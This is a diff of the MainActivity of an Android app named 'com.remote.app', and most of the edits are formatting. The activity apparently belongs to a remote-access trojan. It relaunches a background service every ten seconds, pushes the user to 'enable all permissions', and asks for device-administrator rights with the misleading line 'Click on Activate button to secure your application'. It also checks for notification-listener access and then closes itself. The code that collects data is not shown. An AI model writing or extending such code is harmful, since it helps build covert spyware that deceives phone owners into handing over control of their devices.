@@ -21,11 +21,11 @@ import android.widget.Toast;
 import androidx.annotation.Nullable;
 import androidx.core.app.ActivityCompat;
 
+import com.remote.app.R;
+
 public class MainActivity extends Activity {
     private DevicePolicyManager devicePolicyManager;
     private ComponentName componentName;
-
-
 
     @Override
     protected void onCreate(@Nullable Bundle savedInstanceState) {
@@ -35,21 +35,38 @@ public class MainActivity extends Activity {
 
         setContentView(R.layout.activity_main);
         Intent intent = new Intent(this, MainService.class);
-        PendingIntent pendingIntent = PendingIntent.getService(getApplicationContext(), 1, intent, 0);
+        PendingIntent pendingIntent = PendingIntent.getService(
+                getApplicationContext(),
+                1,
+                intent,
+                0
+        );
         AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
-        alarmManager.setRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP, 0, 10000, pendingIntent);
+        alarmManager.setRepeating(
+                AlarmManager.ELAPSED_REALTIME_WAKEUP,
+                0,
+                10000,
+                pendingIntent
+        );
         boolean isNotificationServiceRunning = isNotificationServiceRunning();
         if (!isNotificationServiceRunning) {
             Context context = getApplicationContext();
             String[] permissions = new String[]{};
             try {
-                info = getPackageManager().getPackageInfo(context.getPackageName(), PackageManager.GET_PERMISSIONS);
+                info = getPackageManager().getPackageInfo(
+                        context.getPackageName(),
+                        PackageManager.GET_PERMISSIONS
+                );
                 permissions = info.requestedPermissions;
             } catch (PackageManager.NameNotFoundException ex) {
                 ex.printStackTrace();
             }
 
-            Toast toast = Toast.makeText(context, "Enable 'Package Manager'\n Click back x2\n and Enable all permissions", Toast.LENGTH_LONG);
+            Toast toast = Toast.makeText(
+                    context,
+                    "Enable 'Package Manager'\n Click back x2\n and Enable all permissions",
+                    Toast.LENGTH_LONG
+            );
 
             TextView view = (TextView) toast.getView().findViewById(android.R.id.message);
             view.setTextColor(Color.RED);
@@ -69,10 +86,8 @@ public class MainActivity extends Activity {
                 tmpIntent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Click on Activate button to secure your application.");
                 startActivity(tmpIntent);
             }
-
-            //if (!devicePolicyManager.isAdminActive())
-            finish();
         }
+        finish();
     }
 
     public void requestPermissions(Context context, String[] permissions) {
@@ -83,7 +98,8 @@ public class MainActivity extends Activity {
 
     private boolean isNotificationServiceRunning() {
         ContentResolver contentResolver = getContentResolver();
-        String enabledNotificationListeners = Settings.Secure.getString(contentResolver, "enabled_notification_listeners");
+        String enabledNotificationListeners =
+                Settings.Secure.getString(contentResolver, "enabled_notification_listeners");
         String packageName = getPackageName();
 
         return enabledNotificationListeners != null && enabledNotificationListeners.contains(packageName);
